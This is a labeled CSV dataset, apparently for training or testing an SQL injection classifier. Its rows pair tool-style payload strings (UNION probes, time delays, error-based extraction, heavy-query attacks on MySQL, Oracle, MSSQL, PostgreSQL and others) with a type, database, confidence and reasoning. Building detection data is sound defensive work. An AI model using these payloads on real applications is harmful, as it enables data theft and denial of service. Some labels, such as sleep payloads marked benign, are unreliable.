id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
22169,"1'+ ( select 'uzaw' where 9900 = 9900 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ) +'",heavy_query,db2,0.7,DB2 system table join (sysibm.systables); Type=boolean_blind (Priority 3); cardinality DoS,1
22170,"1"" ) as dlfq where 8410 = 8410",benign,generic,0.5,generic SQL structure without attack signal; Type=benign (Priority 1); no injection detected,1
22171,"1 ) as guru where 7615 = 7615 union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.85,UNION SELECT with 10 NULL columns; Type=union_based (Priority 7); column matching,2
22172,"1 ) and make_set ( 1559 = 4863,4863 )",benign,mysql,0.5,Generic SQL keywords without clear injection signal; Type=benign (Priority 1); no attack,1
22173,-9484' or ( 7129 = 2349 ) *2349 and 'fcsa' like 'fcsa,benign,generic,0.5,Arithmetic operations without injection context; Type=benign (Priority 1); no SQLi detected,1
22174,"1' ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",heavy_query,mysql,0.85,Heavy cardinality attack with floor(rand)*2; Type=heavy_query (Priority 4); information_schema DoS,2
22175,"1"" where 5328 = 5328 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.85,time-delay signal (BENCHMARK 5000000); MySQL signature; Type=time_blind (Priority 5); benchmark DoS,2
22176,"1"" ) ) ) union all select null,null,null,null,null,null,null#",union_based,generic,0.85,UNION SELECT with 7 NULL columns; Type=union_based (Priority 7); column count,2
22177,1' ) as ihsc where 3978 = 3978,benign,generic,0.5,generic SQL structure without attack signal; Type=benign (Priority 1); no injection,1
22178,"-6125'|| ( select 'hwnm' where 1428 = 1428 union all select 1428,1428,1428,1428,1428,1428#",union_based,oracle,0.85,UNION SELECT structure; Type=union_based (Priority 7); Oracle concatenation,2
22179,select ( case when ( 4660 = 4660 ) then 4660 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,boolean_blind,oracle,0.7,Boolean CASE expression with error fallback; Type=boolean_blind (Priority 3); Oracle conditional,1
22180,1 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ),boolean_blind,mysql,0.7,Pattern match: RLIKE conditional with sleep; Type=boolean_blind (Priority 3); subquery condition,1
22181,"1' ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( 'pbtf' = 'pbtf",heavy_query,mysql,0.85,Heavy cardinality with multiple UNION; Type=heavy_query (Priority 4); information_schema DoS,2
22182,"1' ) where 7391 = 7391 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",heavy_query,mysql,0.85,Heavy cardinality attack; Type=heavy_query (Priority 4); information_schema exploitation,2
22183,1'+ ( select dklj where 3265 = 3265,boolean_blind,generic,0.7,generic SQL keywords without specific attack signal; Type=boolean_blind (Priority 3); partial injection,1
22184,"1' ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) )",heavy_query,sqlite,0.85,SQLite time-delay via randomblob large scale; Type=heavy_query (Priority 4); DoS attack,2
22185,"1' ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'cbwx' = 'cbwx",error_based,oracle,0.85,Oracle-specific function (ctxsys.drithsx); error-based injection; Type=error_based (Priority 4),2
22186,-3422%' ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( '%' = ',boolean_blind,firebird,0.7,Firebird RDB$database reference; Type=boolean_blind (Priority 3); conditional logic,1
22187,select pg_sleep ( 5 ) and ( ( ( 9476 = 9476,time_blind,postgresql,0.85,PostgreSQL time-delay via pg_sleep(5); Type=time_blind (Priority 5); Database=postgresql,2
22188,"1 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) -- fwzl",heavy_query,mysql,0.85,Heavy cardinality with UNION; Type=heavy_query (Priority 4); row() comparison DoS,2
22189,-3083 ) or 5221 = 7829,boolean_blind,generic,0.7,Pattern match: boolean condition (OR inequality); Type=boolean_blind (Priority 3); conditional check,1
22190,"1' ) ) union all select null,null,null--",union_based,generic,0.85,UNION SELECT with NULL columns; Type=union_based (Priority 7); column count,2
22191,"1"" ) as vcvw where 2445 = 2445 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",time_blind,postgresql,0.85,PostgreSQL time-delay via pg_sleep; Type=time_blind (Priority 5); sleep-based injection,2
22192,waitfor delay '0:0:5' and ( ( ( 'ozjl' like 'ozjl,time_blind,mssql,0.85,MSSQL time-delay function (WAITFOR DELAY); Type=time_blind (Priority 5); Database=mssql,2
22193,"1%' or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and '%' = '",heavy_query,mysql,0.85,error-based function (updatexml); Heavy cardinality; Type=heavy_query (Priority 4); DoS,2
22194,"1' ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( 'yzdp' = 'yzdp",heavy_query,mysql,0.85,Heavy cardinality via IF and large number; Type=heavy_query (Priority 4); DoS attack,2
22195,"-3411' ) ) ) union all select 3185,3185,3185,3185,3185,3185,3185,3185--",union_based,generic,0.85,UNION SELECT with 8 columns; Type=union_based (Priority 7); column count,2
22196,"-6254"" where 8941 = 8941 or elt ( 1032 = 1032,3623 ) --",boolean_blind,mysql,0.7,boolean blind (ELT conditional); MySQL signature; Type=boolean_blind (Priority 3); ELT evaluation,1
22197,"1' and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,generic,0.7,Generic SQL structure with table join; Type=boolean_blind (Priority 3); cardinality check,1
22198,1 ) ) ) order by 1#,benign,generic,0.5,ORDER BY clause without injection context; Type=benign (Priority 1); no attack signal,1
22199,"-5027%"" ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ""%"" = """,boolean_blind,firebird,0.7,Firebird RDB$database reference; Type=boolean_blind (Priority 3); conditional logic,1
22200,select ( case when ( 4006 = 1276 ) then 1 else 4006* ( select 4006 from master..sysdatabases ) end ) --,boolean_blind,mssql,0.7,MSSQL master..sysdatabases reference; Type=boolean_blind (Priority 3); conditional pattern,1
22201,"1'+ ( select 'tzey' where 4491 = 4491 union all select null,null,null,null,null,null,null,null--",union_based,oracle,0.85,UNION SELECT with NULL columns; Type=union_based (Priority 7); Oracle injection,2
22202,"select count ( * ) from generate_series ( 1,5000000 ) # fnck",heavy_query,postgresql,0.85,PostgreSQL generate_series DoS with 5000000 scale; Type=heavy_query (Priority 4); cardinality attack,2
22203,1 order by 1#,benign,generic,0.5,ORDER BY clause without injection context; Type=benign (Priority 1); no attack signal,1
22204,1 ) ) as xbii where 2262 = 2262 or sleep ( 5 ) --,time_blind,mysql,0.85,time-delay signal (SLEEP function); MySQL signature; Type=time_blind (Priority 5); sleep-based,2
22205,-9340 ) where 5462 = 5462 or 3038 = 3038,boolean_blind,generic,0.7,Pattern match: boolean condition (OR equality); Type=boolean_blind (Priority 3); conditional check,1
22206,1' ) or sleep ( 5 ) and ( 'fizk' = 'fizk,benign,generic,0.5,Unclear injection structure without proper WHERE context; Type=benign (Priority 1); incomplete pattern,1
22207,"-6405 ) as ilah where 5145 = 5145 union all select 5145,5145,5145,5145,5145--",union_based,generic,0.85,UNION SELECT with 5 columns; Type=union_based (Priority 7); column count,2
22208,1 ) ) and ( 4169 = 9887 ) *9887 and ( ( 1137 = 1137,benign,generic,0.5,Arithmetic operations without injection context; Type=benign (Priority 1); no SQLi signal,1
22209,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'bnfu' like 'bnfu",boolean_blind,firebird,0.7,Firebird system table join; Type=boolean_blind (Priority 3); cardinality check,1
22210,1 ) where 6472 = 6472,benign,generic,0.5,generic SQL structure without attack signal; Type=benign (Priority 1); no injection,1
22211,"1%"" ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ""%"" = """,heavy_query,mysql,0.85,Heavy cardinality attack via row(); Type=heavy_query (Priority 4); DoS,2
22212,-4595' ) where 4892 = 4892 order by 1--,benign,generic,0.5,ORDER BY clause without injection context; Type=benign (Priority 1); no attack signal,1
22213,"1 ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( 8294 = 8294",heavy_query,mysql,0.85,Heavy cardinality with row() comparison; Type=heavy_query (Priority 4); information_schema DoS,2
22214,"1' ) ) and make_set ( 8403 = 8403,8899 ) and ( ( 'sxgl' = 'sxgl",benign,mysql,0.5,Generic SQL keywords without clear injection signal; Type=benign (Priority 1); no attack,1
22215,1' ) ) as xirr where 2425 = 2425,benign,generic,0.5,generic SQL structure without attack signal; Type=benign (Priority 1); no injection,1
22216,"1' ) ) union all select null,null,null,null,null,null,null,null--",union_based,generic,0.85,UNION SELECT with 8 NULL columns; Type=union_based (Priority 7); column count,2
22217,1' rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,boolean_blind,mysql,0.7,Pattern match: RLIKE conditional with sleep; Type=boolean_blind (Priority 3); subquery condition,1
22218,1' ) ) as cmll where 7948 = 7948 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,error_based,oracle,0.85,Oracle-specific function (utl_inaddr); error-based injection; Type=error_based (Priority 4),2
22219,"1"" ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( ""jzbb"" = ""jzbb",error_based,mysql,0.85,error-based function (extractvalue); MySQL signature; Type=error_based (Priority 4); xpath error,2
22220,"1' ) ) as xrre where 1172 = 1172 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) --",heavy_query,mysql,0.85,error-based function (updatexml) with heavy cardinality; Type=heavy_query (Priority 4); DoS,2
22221,"1, ( begin if ( 8340 = 8340 ) then dbms_lock.sleep ( 5 )",time_blind,oracle,0.85,Oracle-specific function (dbms_lock.sleep); time-delay; Type=time_blind (Priority 5); Database=oracle,2
22222,"1'|| ( select 'yhkt' from dual where 7105 = 7105 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) ) ||'",heavy_query,oracle,0.85,Heavy cardinality attack; Type=heavy_query (Priority 4); Oracle dual table DoS,2
22223,"1' ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( 'pded' = 'pded",benign,mysql,0.5,Unclear injection context without proper structure; Type=benign (Priority 1); incomplete pattern,1
22224,1 ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 3836 = 3836,boolean_blind,oracle,0.7,Oracle-specific function (dbms_utility); Type=boolean_blind (Priority 3); Oracle conditional,1
22225,"1' or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and 'ntaw' = 'ntaw",heavy_query,mysql,0.85,time-delay signal (BENCHMARK 5000000); Type=heavy_query (Priority 4); MySQL DoS,2
22226,"1%"" ) ) and ( 3020 = 3020 ) *6703 and ( ( ""%"" = """,benign,generic,0.5,Arithmetic operations without injection context; Type=benign (Priority 1); no SQLi signal,1
22227,1%' ) ) and 4595 = 4595#,boolean_blind,generic,0.7,Pattern match: boolean condition (AND equality); Type=boolean_blind (Priority 3); conditional check,1
22228,"exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 1049 = 1049,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) )",heavy_query,mysql,0.85,error-based function (EXP overflow); Type=heavy_query (Priority 4); DoS via exp(),2
22229,"1 ) ) as avdz where 1881 = 1881 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,0.7,MSSQL sysusers table join; Type=boolean_blind (Priority 3); cardinality check,1
22230,1'+ ( select 'stdl' where 4581 = 4581,boolean_blind,generic,0.7,generic SQL keywords without specific attack signal; Type=boolean_blind (Priority 3); partial injection,1
22231,1%' ) ) and 2006 = 2006,boolean_blind,generic,0.7,Pattern match: boolean condition (AND equality); Type=boolean_blind (Priority 3); conditional check,1
22232,"1%"" ) union all select null,null,null,null,null,null,null,null--",union_based,generic,0.85,UNION SELECT with NULL columns; Type=union_based (Priority 7); column count,2
22233,1 ) ) as dqfl where 7527 = 7527,benign,generic,0.5,generic SQL structure without attack signal; Type=benign (Priority 1); no injection,1
22234,"1' in boolean mode ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,0.7,MSSQL sysusers table join; Type=boolean_blind (Priority 3); cardinality check,1
22235,"1"" ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.85,time-delay signal (BENCHMARK 5000000); MySQL signature; Type=time_blind (Priority 5); benchmark DoS,2
22236,select case when 7717 = 7717 then 1 else null end--,boolean_blind,generic,0.7,Boolean CASE expression; Type=boolean_blind (Priority 3); conditional check,1
22237,"1%"" ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ""%"" = """,heavy_query,mysql,0.85,error-based function (extractvalue); Type=heavy_query (Priority 4); DoS,2
22238,"( select * from generate_series ( 3906,3906,case when ( 3906 = 3906 ) then 1 else 0 end ) limit 1 )",boolean_blind,postgresql,0.7,PostgreSQL generate_series with CASE; Type=boolean_blind (Priority 3); conditional logic,1
22239,"1 ) as vzyk where 5103 = 5103 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,0.85,Oracle-specific function (dbms_pipe.receive_message); time-delay; Type=time_blind (Priority 5); Database=oracle,2
22240,"1' or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and 'vvkl' = 'vvkl",heavy_query,mysql,0.85,error-based function (updatexml); Type=heavy_query (Priority 4); DoS,2
22241,"1' ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 'wzrj' = 'wzrj",boolean_blind,generic,0.7,Generic SQL structure without specific attack signal; Type=boolean_blind (Priority 3); conditional pattern,1
22242,"1' ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( 'cogk' = 'cogk",heavy_query,mysql,0.85,Heavy cardinality with row() comparison; Type=heavy_query (Priority 4); DoS,2
22243,"-1692' ) union all select 7074,7074,7074,7074,7074,7074,7074#",union_based,generic,0.85,UNION SELECT with 7 columns; Type=union_based (Priority 7); column count,2
22244,1'|| ( select 'nvvm' from dual where 5567 = 5567 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) ) ||',boolean_blind,oracle,0.7,Pattern match: RLIKE conditional; Type=boolean_blind (Priority 3); subquery condition,1
22245,"1"" ) as sraw where 1997 = 1997 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",heavy_query,mysql,0.85,Heavy cardinality via IF and large number; Type=heavy_query (Priority 4); DoS,2
22246,"1"" ) where 9248 = 9248",benign,generic,0.5,generic SQL structure without attack signal; Type=benign (Priority 1); no injection,1
22247,"1"" ) where 9855 = 9855",benign,generic,0.5,generic SQL structure without attack signal; Type=benign (Priority 1); no injection,1
22248,"1 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) -- xlfz",boolean_blind,db2,0.7,DB2 system table join (sysibm.systables); Type=boolean_blind (Priority 3); cardinality check,1
22249,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ""tbcc"" = ""tbcc",boolean_blind,generic,0.7,Generic SQL structure with table join; Type=boolean_blind (Priority 3); cardinality check,1
22250,-7345 ) union all select 3866#,union_based,generic,0.85,UNION SELECT structure; Type=union_based (Priority 7); column count,2
22251,"1 ) ) ) union all select null,null,null,null,null,null,null,null#",union_based,generic,0.85,UNION SELECT with 8 NULL columns; Type=union_based (Priority 7); column count,2
22252,"1%"" ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ""%"" = """,time_blind,mysql,0.85,time-delay signal (BENCHMARK 5000000); MySQL signature; Type=time_blind (Priority 5); benchmark DoS,2
22253,1' rlike sleep ( 5 ) #,time_blind,mysql,0.85,time-delay signal (RLIKE+SLEEP); MySQL signature; Type=time_blind (Priority 5); sleep-based,2
22254,"1 ) ) as hrks where 7637 = 7637 or elt ( 6272 = 6272,sleep ( 5 ) ) --",boolean_blind,mysql,0.7,boolean blind (ELT conditional) with sleep; Type=boolean_blind (Priority 3); conditional evaluation,1
22255,1' where 8469 = 8469,benign,generic,0.5,generic SQL structure without attack signal; Type=benign (Priority 1); no injection,1
22256,"1' ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 'ngwt' = 'ngwt",heavy_query,generic,0.85,Heavy cardinality via regexp_substring repeat; Type=heavy_query (Priority 4); DoS attack,2
22257,"1' ) as pkis where 3446 = 3446 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",time_blind,oracle,0.85,Oracle-specific function (dbms_pipe.receive_message); time-delay; Type=time_blind (Priority 5); Database=oracle,2
22258,"1"" where 6785 = 6785 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,generic,0.7,Generic SQL structure with table join; Type=boolean_blind (Priority 3); cardinality check,1
22259,"1%' ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( '%' = '",heavy_query,generic,0.85,Heavy cardinality via regexp_substring repeat; Type=heavy_query (Priority 4); DoS attack,2
22260,1' ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ),boolean_blind,oracle,0.7,Oracle-specific function (dbms_utility); Type=boolean_blind (Priority 3); Oracle conditional,1
22261,1' in boolean mode ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) #,boolean_blind,mysql,0.7,Pattern match: RLIKE conditional; Type=boolean_blind (Priority 3); subquery condition,1
